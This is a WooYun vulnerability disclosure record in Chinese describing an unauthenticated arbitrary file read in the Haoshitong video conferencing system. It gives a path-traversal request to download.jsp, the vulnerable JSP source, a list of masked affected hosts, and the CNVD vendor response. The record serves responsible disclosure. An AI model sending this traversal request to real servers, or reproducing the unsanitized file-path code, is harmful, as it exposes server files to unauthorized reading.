{"id": 84680, "wybug_id": "wooyun-2015-0143719", "wybug_title": "好视通视频会议系统存在通用型设计缺陷可任意文件遍历读取(无需登录)", "wybug_corp": "深圳市华视瑞通信息技术有限公司", "wybug_author": "YY-2012", "wybug_date": "2015-10-06 21:42", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "任意文件读取"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： rt 详细说明：  好视通--企业级视频会议系统存在任意文件遍历(无需登录)利用方式：\nhttp://地址/dbbackup/adminMgr/download.jsp?fileName=../../dbbackup/adminMgr/download.jsp\n源代码：\nï»¿<%@ page language=\"java\" import=\"**.**.**.**.*\" import=\"**.**.**.**.*\" import=\"com.backup.util.*\" pageEncoding=\"utf-8\"%>   <%@ taglib uri=\"http://**.**.**.**/tags-bean\" prefix=\"bean\" %><%@ taglib uri=\"http://**.**.**.**/tags-html\" prefix=\"html\" %><%@ taglib uri=\"http://**.**.**.**/tags-logic\" prefix=\"logic\" %><%@ taglib uri=\"http://**.**.**.**/tags-tiles\" prefix=\"tiles\" %><%  \tString info=\"\";\tinfo = request.getParameter(\"info\");\tif(info==null)\t{\t\t//æä»¶è·¯å¾\t\tString Path = ConfigMgr.getBackupPath()+\"/\";\t    \tString filename = request.getParameter(\"fileName\");        \tint i = 0;        \t\t//è§£å³ä¸è½½ä¹±ç é®é¢   \t\tif (request.getHeader(\"User-Agent\").toLowerCase().indexOf(\"firefox\") > 0)      \t\tfilename = new String(filename.getBytes(\"UTF-8\"), \"ISO8859-1\");//firefoxæµè§å¨   \t\telse if (request.getHeader(\"User-Agent\").toUpperCase().indexOf(\"MSIE\") > 0)      \t\tfilename = URLEncoder.encode(filename, \"UTF-8\");//IEæµè§å¨      \tresponse.reset();       \tresponse.setContentType(\"application/octet-stream\");           \tresponse.setHeader(\"Content-Disposition\",\"attachment;filename = \"+filename);        \t**.**.**.**.FileInputStream fileInputStream = new **.**.**.**.FileInputStream(Path+filename);      \t\twhile((i= fileInputStream.read()) != -1){           \tout.write(i);       \t}   \t}\telse if(info.endsWith(\"export\"))\t{\t\t\t\tString filename = request.getParameter(\"filename\");\t\t//æä»¶è·¯å¾\t\tString Path = ConfigMgr.getExportPath();\t\t\t  \tint i = 0;         \t\t//è§£å³ä¸è½½ä¹±ç é®é¢   \t\tif (request.getHeader(\"User-Agent\").toLowerCase().indexOf(\"firefox\") > 0)      \t\tfilename = new String(filename.getBytes(\"UTF-8\"), \"ISO8859-1\");//firefoxæµè§å¨   \t\telse if (request.getHeader(\"User-Agent\").toUpperCase().indexOf(\"MSIE\") > 0)      \t\tfilename = URLEncoder.encode(filename, \"UTF-8\");//IEæµè§å¨       \tresponse.setContentType(\"application/octet-stream\");     \t        \t      \tresponse.setHeader(\"Content-Disposition\",\"attachment;filename = \"+filename);        \t**.**.**.**.FileInputStream fileInputStream = new **.**.**.**.FileInputStream(Path+filename);     \tOutputStream  os = response.getOutputStream();    \t\twhile((i= fileInputStream.read()) != -1){      \t\t\tos.write(i);    \t}       \tout.clear();\t\tout = pageContext.pushBody();\t}\t%>\n   漏洞证明：  \n\n\n\n\n\n案例：\n**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:81/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/**.**.**.**:8080/\n   修复方案：  联系厂商   版权声明：转载请注明来源 YY-2012@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-12 10:41 厂商回复：     CNVD确认并复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}